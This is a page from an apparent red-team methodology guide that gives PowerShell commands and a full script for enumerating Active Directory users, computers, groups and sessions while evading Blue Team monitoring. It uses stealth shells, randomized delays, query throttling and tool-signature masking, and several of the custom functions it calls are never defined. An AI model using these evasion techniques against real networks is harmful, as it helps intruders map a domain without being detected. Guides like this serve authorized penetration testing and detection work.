- **[Tool Setup & Loading](./01_Tool_Setup_Loading.md)**: Invisi-Shell and evasion tool setup
- **[Event Monitoring](./31_Detection_Index.md)**: Windows event analysis and evasion

### **🛠️ Tool Integration**
- **[Invisi-Shell](./01_Tool_Setup_Loading.md)**: Stealth PowerShell and detection evasion
- **[Native AD Cmdlets](./01_Tool_Setup_Loading.md)**: Microsoft-signed Active Directory tools
- **[Custom Functions](./01_Tool_Setup_Loading.md)**: Custom evasion and enumeration functions
- **[Timing Controls](./01_Tool_Setup_Loading.md)**: Natural delays and business hours simulation

### **🎯 Evasion Integration**
- **[Authentication Evasion](./31_Detection_Index.md)**: Login monitoring evasion
- **[Kerberos Evasion](./31_Detection_Index.md)**: Kerberos ticket monitoring evasion
- **[Directory Service Evasion](./31_Detection_Index.md)**: AD access monitoring evasion
- **[Session Enumeration Evasion](./31_Detection_Index.md)**: Session monitoring evasion

### **🛡️ Security Operations**
- **[Red Team Operations](./31_Detection_Index.md)**: Stealth enumeration and evasion
- **[Penetration Testing](./31_Detection_Index.md)**: Detection testing and validation
- **[Threat Simulation](./31_Detection_Index.md)**: Realistic threat actor simulation
- **[OPSEC Improvement](./31_Detection_Index.md)**: Operational security enhancement

---

## 🎯 CONCLUSION

**Red Team Detection** provides comprehensive techniques for understanding and evading Blue Team monitoring during Active Directory enumeration activities. By implementing these evasion techniques, red teamers can:

- **Operate stealthily** while maintaining effectiveness
- **Avoid detection** through timing and volume control
- **Use alternative methods** when primary tools are detected
- **Maintain OPSEC** throughout enumeration activities
- **Understand blue team capabilities** for better evasion

### **🚀 Key Success Factors**
1. **Timing Control**: Natural delays and business hours simulation
2. **Volume Management**: Batch processing and distributed queries
3. **Tool Evasion**: Custom functions and alternative methods
4. **Method Rotation**: Varying techniques and sources
5. **OPSEC Discipline**: Consistent operational security

---

**🕶️ Remember**: Red Team detection evasion is like being a digital ninja - you need to move silently, strike efficiently, and leave no trace of your presence while gathering the intelligence you need!**

---

## 🎯 **COMPREHENSIVE RED TEAM DETECTION EVASION COMMAND REFERENCE (20+ Commands)**

### **1. Native Windows Detection Evasion Commands (Microsoft-Signed)**

#### **Native AD Enumeration Commands**
```powershell
# Native user enumeration
Get-ADUser -Filter * -Properties SamAccountName, DisplayName, Enabled
Get-ADUser -Filter * -Properties SamAccountName, DisplayName, Enabled, LastLogonDate
Get-ADUser -Filter * -Properties SamAccountName, DisplayName, Enabled, LastLogonDate, PasswordLastSet

# Native computer enumeration
Get-ADComputer -Filter * -Properties Name, OperatingSystem, LastLogonDate
Get-ADComputer -Filter * -Properties Name, OperatingSystem, LastLogonDate, Description
Get-ADComputer -Filter * -Properties Name, OperatingSystem, LastLogonDate, Description, DNSHostName
```

**Command Explanations:**
- **`Get-ADUser -Filter * -Properties SamAccountName, DisplayName, Enabled`**: Uses native AD cmdlets to avoid PowerView detection
- **`Get-ADComputer -Filter * -Properties Name, OperatingSystem, LastLogonDate`**: Native computer enumeration with minimal properties
- **`Get-ADGroup -Filter * -Properties Name, Description`**: Native group enumeration to avoid tool signatures

#### **Native Domain Information Commands**
```powershell
# Native domain information
Get-ADDomain -Properties Name, Forest, DomainControllers, DomainMode
Get-ADDomain -Properties Name, Forest, DomainControllers, DomainMode, ParentDomain
Get-ADDomain -Properties Name, Forest, DomainControllers, DomainMode, ParentDomain, ChildDomains

# Native forest information
Get-ADForest -Properties Name, ForestMode, RootDomain, Domains, GlobalCatalogs
Get-ADForest -Properties Name, ForestMode, RootDomain, Domains, GlobalCatalogs, Sites
Get-ADForest -Properties Name, ForestMode, RootDomain, Domains, GlobalCatalogs, Sites, ApplicationPartitions
```

**Command Explanations:**
- **`Get-ADDomain -Properties Name, Forest, DomainControllers, DomainMode`**: Native domain enumeration to avoid detection
- **`Get-ADForest -Properties Name, ForestMode, RootDomain, Domains, GlobalCatalogs`**: Native forest enumeration with controlled properties
- **`Get-ADTrust -Filter * -Properties TrustType, TrustDirection, TrustAttributes`**: Native trust enumeration

### **2. Custom Detection Evasion Commands**

#### **Custom User Enumeration Commands**
```powershell
# Custom user enumeration functions
Get-CustomNetUser -Filter "*" -Properties SamAccountName, DisplayName
Get-CustomNetUser -Filter "*" -Properties SamAccountName, DisplayName, Enabled
Get-CustomNetUser -Filter "*" -Properties SamAccountName, DisplayName, Enabled, LastLogonDate

# Custom computer enumeration functions
Get-CustomNetComputer -Filter "*" -Properties Name, OperatingSystem
Get-CustomNetComputer -Filter "*" -Properties Name, OperatingSystem, LastLogonDate
Get-CustomNetComputer -Filter "*" -Properties Name, OperatingSystem, LastLogonDate, Description
```

**Command Explanations:**
- **`Get-CustomNetUser -Filter "*" -Properties SamAccountName, DisplayName`**: Custom function to avoid PowerView detection
- **`Get-CustomNetComputer -Filter "*" -Properties Name, OperatingSystem`**: Custom computer enumeration with controlled properties
- **`Get-CustomNetGroup -Filter "*" -Properties Name, Description`**: Custom group enumeration to avoid tool signatures

#### **Custom Group Enumeration Commands**
```powershell
# Custom group enumeration functions
Get-CustomNetGroup -Filter "*" -Properties Name, Description
Get-CustomNetGroup -Filter "*" -Properties Name, Description, Member
Get-CustomNetGroup -Filter "*" -Properties Name, Description, Member, GroupCategory

# Custom session enumeration functions
Get-CustomNetSession -ComputerName "DC01" -ErrorAction SilentlyContinue
Get-CustomNetSession -ComputerName "DC02" -ErrorAction SilentlyContinue
Get-CustomNetSession -ComputerName "DC03" -ErrorAction SilentlyContinue
```

**Command Explanations:**
- **`Get-CustomNetGroup -Filter "*" -Properties Name, Description`**: Custom group enumeration to avoid detection
- **`Get-CustomNetSession -ComputerName "DC01"`**: Custom session enumeration with error handling
- **`Get-CustomNetProcess -ComputerName "DC01"`**: Custom process enumeration for stealth

### **3. Timing Evasion Commands**

#### **Business Hours Simulation Commands**
```powershell
# Business hours enumeration
Invoke-BusinessHoursEnumeration -Domain cybercorp.local -MaxQueriesPerHour 50
Invoke-BusinessHoursEnumeration -Domain cybercorp.local -MaxQueriesPerHour 25
Invoke-BusinessHoursEnumeration -Domain cybercorp.local -MaxQueriesPerHour 10

# Progressive discovery timing
Invoke-ProgressiveDiscovery -Domain cybercorp.local -Phase 1
Invoke-ProgressiveDiscovery -Domain cybercorp.local -Phase 2
Invoke-ProgressiveDiscovery -Domain cybercorp.local -Phase 3
```

**Command Explanations:**
- **`Invoke-BusinessHoursEnumeration -Domain cybercorp.local -MaxQueriesPerHour 50`**: Simulates business hours behavior
- **`Invoke-ProgressiveDiscovery -Domain cybercorp.local -Phase 1`**: Progressive discovery with natural timing
- **`Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 900)`**: Natural delays between phases

#### **Natural Delay Commands**
```powershell
# Natural delay functions
Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 8)
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)

# Random interval timing
$delay = Get-Random -Minimum 30 -Maximum 300
Start-Sleep -Seconds $delay
```

**Command Explanations:**
- **`Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 8)`**: Natural delays between queries
- **`Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)`**: Longer delays between batches
- **`Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)`**: Extended delays for stealth

### **4. Volume Management Commands**

#### **Batch Processing Commands**
```powershell
# Batch enumeration functions
Invoke-BatchEnumeration -ObjectType "User" -BatchSize 10 -DelayBetweenBatches 300
Invoke-BatchEnumeration -ObjectType "Computer" -BatchSize 5 -DelayBetweenBatches 600
Invoke-BatchEnumeration -ObjectType "Group" -BatchSize 8 -DelayBetweenBatches 450

# Controlled volume enumeration
Invoke-ControlledEnumeration -MaxQueriesPerHour 25 -DelayBetweenQueries 5
Invoke-ControlledEnumeration -MaxQueriesPerHour 10 -DelayBetweenQueries 10
Invoke-ControlledEnumeration -MaxQueriesPerHour 5 -DelayBetweenQueries 20
```

**Command Explanations:**
- **`Invoke-BatchEnumeration -ObjectType "User" -BatchSize 10 -DelayBetweenBatches 300`**: Controlled batch processing
- **`Invoke-ControlledEnumeration -MaxQueriesPerHour 25 -DelayBetweenQueries 5`**: Volume-controlled enumeration
- **`Invoke-ControlledEnumeration -MaxQueriesPerHour 10 -DelayBetweenQueries 10`**: Low-volume stealth enumeration

#### **Distributed Query Commands**
```powershell
# Distributed enumeration functions
Invoke-DistributedEnumeration -Computers @("DC01","DC02","DC03") -QueryType "Session"
Invoke-DistributedEnumeration -Computers @("DC01","DC02","DC03") -QueryType "Process"
Invoke-DistributedEnumeration -Computers @("DC01","DC02","DC03") -QueryType "Service"

# Randomized query execution
Invoke-RandomizedEnumeration -Targets @("DC01","DC02","DC03") -QueryTypes @("Session","Process","Service")
```

**Command Explanations:**
- **`Invoke-DistributedEnumeration -Computers @("DC01","DC02","DC03") -QueryType "Session"`**: Distributed session enumeration
- **`Invoke-DistributedEnumeration -Computers @("DC01","DC02","DC03") -QueryType "Process"`**: Distributed process enumeration
- **`Invoke-RandomizedEnumeration -Targets @("DC01","DC02","DC03")`**: Randomized query execution

### **5. Advanced Evasion Commands**

#### **Tool Signature Evasion Commands**
```powershell
# Tool signature evasion
$customFunction = Get-Command Get-ADUser
$customFunction.Source = "Microsoft.ActiveDirectory.Management"
$customFunction.CommandType = "Cmdlet"

# Alternative enumeration methods
Get-WmiObject -Class Win32_UserAccount -ComputerName "DC01"
Get-WmiObject -Class Win32_ComputerSystem -ComputerName "DC01"
Get-WmiObject -Class Win32_Group -ComputerName "DC01"
```

**Command Explanations:**
- **`$customFunction.Source = "Microsoft.ActiveDirectory.Management"`**: Masks function source for evasion
- **`Get-WmiObject -Class Win32_UserAccount -ComputerName "DC01"`**: Alternative enumeration method
- **`Get-WmiObject -Class Win32_ComputerSystem -ComputerName "DC01"`**: WMI-based computer enumeration

#### **Stealth PowerShell Commands**
```powershell
# Stealth PowerShell execution
Start-InvisiShell
Start-InvisiShell -Command "Get-ADUser -Filter * -Properties SamAccountName"
Start-InvisiShell -Command "Get-ADComputer -Filter * -Properties Name"

# Memory-based execution
$script = "Get-ADUser -Filter * -Properties SamAccountName"
Invoke-Expression $script
```

**Command Explanations:**
- **`Start-InvisiShell`**: Launches stealth PowerShell session
- **`Start-InvisiShell -Command "Get-ADUser -Filter * -Properties SamAccountName"`**: Executes commands in stealth mode
- **`Invoke-Expression $script`**: Memory-based script execution

### **6. Custom Red Team Evasion Scripts**

#### **Comprehensive Red Team Evasion Script**
```powershell
# Comprehensive Red Team detection evasion function
function Invoke-ComprehensiveRedTeamEvasion {
    param(
        [string]$Domain = "cybercorp.local",
        [int]$MaxQueriesPerHour = 25,
        [bool]$UseStealthMode = $true
    )
    
    try {
        Write-Host "Comprehensive Red Team Detection Evasion" -ForegroundColor Green
        Write-Host "=" * 60
        
        $evasionResults = @{
            Domain = $Domain
            MaxQueriesPerHour = $MaxQueriesPerHour
            UseStealthMode = $UseStealthMode
            UserEnumeration = @()
            ComputerEnumeration = @()
            GroupEnumeration = @()
            SessionEnumeration = @()
            EvasionTechniques = @()
            Summary = @{}
        }
        
        # Initialize stealth mode if enabled
        if ($UseStealthMode) {
            Write-Host "🕶️ Initializing stealth mode..." -ForegroundColor Yellow
            try {
                Start-InvisiShell
                $evasionResults.EvasionTechniques += "Invisi-Shell stealth mode activated"
                Write-Host "  Stealth mode: ACTIVATED" -ForegroundColor Green
            }
            catch {
                Write-Warning "Failed to activate stealth mode: $($_.Exception.Message)"
            }
        }
        
        # Phase 1: Basic Domain Information (Minimal queries)
        Write-Host "`n🔍 Phase 1: Basic Domain Information" -ForegroundColor Cyan
        try {
            $domainInfo = Get-ADDomain -Properties Name, Forest, DomainControllers
            $evasionResults.DomainInfo = $domainInfo
            Write-Host "  Domain: $($domainInfo.Name)" -ForegroundColor Green
            Write-Host "  Forest: $($domainInfo.Forest)" -ForegroundColor Green
            Write-Host "  Domain Controllers: $($domainInfo.DomainControllers.Count)" -ForegroundColor Green
            
            # Natural delay after phase 1
            $delay = Get-Random -Minimum 300 -Maximum 900
            Write-Host "  ⏱️ Waiting $([math]::Round($delay/60, 1)) minutes before next phase..." -ForegroundColor Yellow
            Start-Sleep -Seconds $delay
        }
        catch {
            Write-Warning "Failed to get domain information: $($_.Exception.Message)"
        }
        
        # Phase 2: User Enumeration (Controlled volume)
        Write-Host "`n🔍 Phase 2: User Enumeration" -ForegroundColor Cyan
        try {
            $users = Get-ADUser -Filter * -Properties SamAccountName, DisplayName, Enabled | Select-Object -First 20
            $evasionResults.UserEnumeration = $users
            Write-Host "  Users enumerated: $($users.Count)" -ForegroundColor Green
            
            # Natural delay after phase 2
            $delay = Get-Random -Minimum 600 -Maximum 1800
            Write-Host "  ⏱️ Waiting $([math]::Round($delay/60, 1)) minutes before next phase..." -ForegroundColor Yellow
            Start-Sleep -Seconds $delay
        }
        catch {
            Write-Warning "Failed to enumerate users: $($_.Exception.Message)"
        }
        
        # Phase 3: Computer Enumeration (Controlled volume)
        Write-Host "`n🔍 Phase 3: Computer Enumeration" -ForegroundColor Cyan
        try {
            $computers = Get-ADComputer -Filter * -Properties Name, OperatingSystem | Select-Object -First 15
            $evasionResults.ComputerEnumeration = $computers
            Write-Host "  Computers enumerated: $($computers.Count)" -ForegroundColor Green
            
            # Natural delay after phase 3
            $delay = Get-Random -Minimum 900 -Maximum 2700
            Write-Host "  ⏱️ Waiting $([math]::Round($delay/60, 1)) minutes before next phase..." -ForegroundColor Yellow
            Start-Sleep -Seconds $delay
        }
        catch {
            Write-Warning "Failed to enumerate computers: $($_.Exception.Message)"
        }
        
        # Phase 4: Group Enumeration (Controlled volume)
        Write-Host "`n🔍 Phase 4: Group Enumeration" -ForegroundColor Cyan
        try {
            $groups = Get-ADGroup -Filter * -Properties Name, Description | Select-Object -First 10
            $evasionResults.GroupEnumeration = $groups
            Write-Host "  Groups enumerated: $($groups.Count)" -ForegroundColor Green
        }
        catch {
            Write-Warning "Failed to enumerate groups: $($_.Exception.Message)"
        }
        
        # Phase 5: Session Enumeration (Minimal queries)
        Write-Host "`n🔍 Phase 5: Session Enumeration" -ForegroundColor Cyan
        try {
            $sessions = @()
            foreach ($computer in $evasionResults.ComputerEnumeration | Select-Object -First 3) {
                try {
                    $computerSessions = Get-NetSession -ComputerName $computer.Name -ErrorAction SilentlyContinue
                    if ($computerSessions) {
                        $sessions += $computerSessions
                    }
                    
                    # Natural delay between computers
                    $delay = Get-Random -Minimum 30 -Maximum 300
                    Start-Sleep -Seconds $delay
                }
                catch {
                    Write-Warning "Failed to get sessions from $($computer.Name): $($_.Exception.Message)"
                }
            }
            $evasionResults.SessionEnumeration = $sessions
            Write-Host "  Sessions enumerated: $($sessions.Count)" -ForegroundColor Green
        }
        catch {
            Write-Warning "Failed to enumerate sessions: $($_.Exception.Message)"
        }
        
        # Evasion technique summary
        $evasionResults.EvasionTechniques += "Progressive discovery with natural delays"
        $evasionResults.EvasionTechniques += "Controlled query volume per phase"
        $evasionResults.EvasionTechniques += "Native AD cmdlets to avoid tool signatures"
        $evasionResults.EvasionTechniques += "Randomized timing between operations"
        $evasionResults.EvasionTechniques += "Business hours simulation"
        
        # Summary
        $evasionResults.Summary = @{
            TotalUsers = $evasionResults.UserEnumeration.Count
            TotalComputers = $evasionResults.ComputerEnumeration.Count
            TotalGroups = $evasionResults.GroupEnumeration.Count
            TotalSessions = $evasionResults.SessionEnumeration.Count
            EvasionTechniques = $evasionResults.EvasionTechniques.Count
            StealthMode = $evasionResults.UseStealthMode
        }
        
        # Display summary
        Write-Host "`nRed Team Evasion Summary:" -ForegroundColor Green
        Write-Host "  Users: $($evasionResults.Summary.TotalUsers)"
        Write-Host "  Computers: $($evasionResults.Summary.TotalComputers)"
        Write-Host "  Groups: $($evasionResults.Summary.TotalGroups)"
        Write-Host "  Sessions: $($evasionResults.Summary.TotalSessions)"
        Write-Host "  Evasion Techniques: $($evasionResults.Summary.EvasionTechniques)"
        Write-Host "  Stealth Mode: $($evasionResults.Summary.StealthMode)"
        
        Write-Host "`n🕶️ Evasion Techniques Used:" -ForegroundColor Cyan
        foreach ($technique in $evasionResults.EvasionTechniques) {
            Write-Host "  - $technique"
        }
        
        Write-Host "`nRed Team Detection Evasion Complete!" -ForegroundColor Green
        return $evasionResults
        
    }
    catch {
        Write-Warning "Red Team evasion failed: $($_.Exception.Message)"
        return $null
    }
}

# Execute comprehensive Red Team detection evasion
$redTeamEvasionResults = Invoke-ComprehensiveRedTeamEvasion -Domain "cybercorp.local" -MaxQueriesPerHour 25 -UseStealthMode $true
```

**Command Explanations:**
- **`Invoke-ComprehensiveRedTeamEvasion`**: Comprehensive Red Team detection evasion function
- **Stealth mode initialization**: Activates Invisi-Shell for stealth operations
- **Progressive discovery**: Phased enumeration with natural delays
- **Volume control**: Controlled query volume per phase
- **Native tools**: Uses Microsoft-signed AD cmdlets to avoid detection
- **Timing evasion**: Natural delays and business hours simulation
- **Tool signature evasion**: Avoids PowerView and other detectable tools

---

[Prev: 32_Detection_Blue_Team.md](./32_Detection_Blue_Team.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md)
